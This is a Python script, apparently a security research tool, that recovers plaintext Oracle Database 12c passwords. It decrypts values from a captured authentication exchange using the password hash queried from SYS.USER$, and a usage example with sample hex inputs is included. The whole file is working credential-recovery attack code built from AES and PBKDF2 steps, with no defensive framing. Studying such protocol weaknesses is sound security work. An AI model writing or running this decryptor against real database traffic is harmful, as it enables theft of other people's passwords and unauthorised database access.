# Oracle Database 12c password decryptor
#
# Uses data from from a successful authentication network capture 
# and the password hash from SYS.USER$ (only first 128 characters of the T: part)
#
#   SELECT spare4 FROM SYS.USER$ WHERE NAME = '<ACCOUNT>'
#
# Requires:
#             pbkdf2 package (https://pypi.python.org/pypi/pbkdf2)
#             PyCrypto package (https://pypi.python.org/pypi/pycrypto/2.6.1)


import sys, getopt
import binascii
import pbkdf2, hashlib, hmac
from Crypto.Cipher import AES


def Usage():
    print("pwd_decrypt_12c.py --server_auth_sesskey <...> --pbkdf2salt <...>  --client_auth_sesskey <...> --auth_password <...> --t_hash <...>")
    print("""\nExample:\n \npwd_decrypt_12c.py --server_auth_sesskey 8963123F6B26252274A89F99BCC0874DBC33610223E2B38B75E6A4CD6E634E43 --pbkdf2salt F05B0CF7F4C981D4808CF6CB4AF69639 --client_auth_sesskey 2C71F05311768D959E976F29ED4342DB14A89A0B3DBA6670B16CA1B037E97D49 --auth_password 16F0041169FF54075D5C69695BCA25EB4BC549B53F27FA2B649C3D51D8FDF41A --t_hash 142372864D44C9E299CE90E2A593F3DB807E424D32E15DF0AE0B7819D9BBBFF9220A5FBFB1EA3F4457582267404EBC7D9EA6D4798276CB3F9927EE4C12BCD912""")

def main():
    
    # May need adjustment too
    PBKDF2SderCount = 3
    PBKDF2VgenCount = 4096
    T_HASH = None
    PBKDF2Salt = None
    CLIENT_AUTH_SESSKEY = None
    SERVER_AUTH_SESSKEY = None
    AUTH_PASSWORD = None
    
    try:
        opts, args = getopt.getopt(sys.argv[1:], "htscsp", ["help", "t_hash=", "pbkdf2salt=", "client_auth_sesskey=", "server_auth_sesskey=", "auth_password="])
    except getopt.GetoptError:
        print("getopt.GetoptError")
        Usage()
        sys.exit(2) 
    
    for opt, arg in opts:
        if opt in ("-h", "--help"):
            Usage()
            sys.exit()
        elif opt in ("-t_hash", "--t_hash"):
            T_HASH = arg
        elif opt in ("-pbkdf2salt", "--pbkdf2salt"):
            PBKDF2Salt = arg
        elif opt in ("-client_auth_sesskey", "--client_auth_sesskey"):
            CLIENT_AUTH_SESSKEY = arg
        elif opt in ("-server_auth_sesskey", "--server_auth_sesskey"):
            SERVER_AUTH_SESSKEY = arg
        elif opt in ("-auth_password", "--auth_password"):
            AUTH_PASSWORD = arg
    
    if (T_HASH == None or PBKDF2Salt == None or  CLIENT_AUTH_SESSKEY == None or SERVER_AUTH_SESSKEY == None or AUTH_PASSWORD == None):
        Usage()
        sys.exit(2)
            
    T = binascii.unhexlify(T_HASH)
    
    bin_client_session_key = binascii.unhexlify(CLIENT_AUTH_SESSKEY)
    bin_server_session_key = binascii.unhexlify(SERVER_AUTH_SESSKEY)
    bin_PBKDF2Salt = binascii.unhexlify(PBKDF2Salt)
    bin_password = binascii.unhexlify(AUTH_PASSWORD)

    obj = AES.new(T[0:32], AES.MODE_CBC, '\x00'*16)
    client_generated_random_salt = obj.decrypt(bin_client_session_key)

    obj = AES.new(T[0:32], AES.MODE_CBC, '\x00'*16)
    cryptotext = obj.decrypt(bin_server_session_key)

    decryption_key = pbkdf2.PBKDF2(binascii.hexlify(client_generated_random_salt + cryptotext).upper(), bin_PBKDF2Salt, PBKDF2SderCount, hashlib.sha512, hmac).read(32)
    
    obj = AES.new(decryption_key, AES.MODE_CBC, '\x00'*16)
    password_net = obj.decrypt(bin_password)
    print("\n\tDecrypted password: %s" %(password_net[16:]))


if __name__ == "__main__":
    main()